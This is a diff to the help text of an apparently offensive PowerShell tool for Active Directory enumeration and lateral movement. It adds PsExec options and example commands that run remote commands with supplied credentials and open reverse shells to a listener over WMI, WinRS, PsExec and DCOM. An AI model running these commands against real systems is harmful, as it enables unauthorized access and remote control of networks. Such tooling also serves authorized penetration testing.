@@ -78,11 +78,15 @@ if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
   '<param1>' == 'dcinfo'     -->  Prints out DC name, hostname, OS, OS version, IPv4 and IPv6
   '<param1>' == 'deviceinfo' -->  Prints out AD devices' info: Name, hostname, OS, OS SP, OS version, 
                                   IPv4 and IPv6
+  '<param1>' == 'psexec'     --\  Write PsExec.exe or PsExec64.exe to disk.
+             == 'psexec64'   --/  Stored as base64 inside this script.
   
   For example:
   .\enumhelper.ps1 'spnlist'
   .\enumhelper.ps1 'dcinfo'
   .\enumhelper.ps1 'deviceinfo'
+  .\enumhelper.ps1 'psexec' 
+  .\enumhelper.ps1 'psexec64'
  
 <------------------------------------------------------------------------------------------------------->
  
@@ -121,25 +125,28 @@ if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
   For example:
   .\enumhelper.ps1 'psremote' 'adminusername' 'adminpassword' 'dc1.testad.local'
  
-  With adding '<param5>' we can try to run remote commands over WMI or WINRS:
-  '<param1>' == 'wmi' '<param2>' == 'username'  '<param3>' == 'password'  '<param4>' == target IP
+ With adding '<param5>' we can try to run remote commands over WMI, WINRS OR PSEXEC/64:
+  '<param1>' == 'wmi' '<param2>' == 'username' '<param3>' == 'password'  '<param4>' == target IP
   '<param5>' == remote command to run
   or
   '<param1>' == 'winrs' '<param2>' == 'username'  '<param3>' == 'password'  '<param4>' == target hostname
   '<param5>' == remote command to run
-  
+  or
+  '<param1>' == 'psexec' '<param2>' == 'username' '<param3>' == password '<param4>' == target hostname/IP 
+  '<param5>' == remote command to run
+  or for the 64bit version
+  '<param1>' == 'psexec64' '<param2>' == 'username' '<param3>' == password '<param4>' == target hostname/IP 
+  '<param5>' == remote command to run
+
   For example:
   .\enumhelper.ps1 'wmi' 'username' 'password' '192.168.12.34' 'cmd'
   .\enumhelper.ps1 'winrs' 'username' 'password' 'dc.testad.local' 'cmd'
+  .\enumhelper.ps1 'psexec' 'user' 'pass' 'shadydest.local' 'cmd /c whoami'
+  .\enumhelper.ps1 'psexec64' 'user' 'pass' 'shadydest.local' 'cmd /c whoami'
   !NOTE: you can just run with 'wmi' or 'winrs' and the rest will be prompted.
-  
-  You can also run reverse shell over DCOM:
-  '<param1>* == 'dcom' '<param2>' == target IP '<param3>' == 'reverse-shell' '<param4>' == lhost IP 
-  '<param5>' == lhost port
-  
-  For example:
-  .\enumhelper.ps1 'dcom' '192.168.12.34' 'reverse-shell' '192.168.23.45' '4444'
- 
+
+<------------------------------------------------------------------------------------------------------->
+
   To further expand WMI / WINRS we can also launch a prebuilt reverse shell command, you just need to enter:
   '<param5>' == 'reverse-shell' '<param6>' == lhost IP '<param7>' == lhost port or use the same 
   param5 when prompted for a command:
@@ -147,6 +154,15 @@ if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
   For example:
   .\enumhelper.ps1 'wmi' 'username' 'password' '192.168.12.34' 'reverse-shell' '192.168.23.45' '4444'
   .\enumhelper.ps1 'winrs' 'username' 'password' 'dc.testad.local' 'reverse-shell' '192.168.23.45' '4444'
+  .\enumhelper.ps1 'psexec' 'username' 'password' 'host.testad.local' 'reverse-shell' '192.168.23.45' '4444'
+  .\enumhelper.ps1 'psexec64' 'username' 'password' '192.168.0.20' 'reverse-shell' '192.168.23.45' '4444'  
+  
+  You can also run reverse shell over DCOM:
+  '<param1>* == 'dcom' '<param2>' == target IP '<param3>' == 'reverse-shell' '<param4>' == lhost IP 
+  '<param5>' == lhost port
+  
+  For example:
+  .\enumhelper.ps1 'dcom' '192.168.12.34' 'reverse-shell' '192.168.23.45' '4444'
   
 <------------------------------------------------------------------------------------------------------->
  
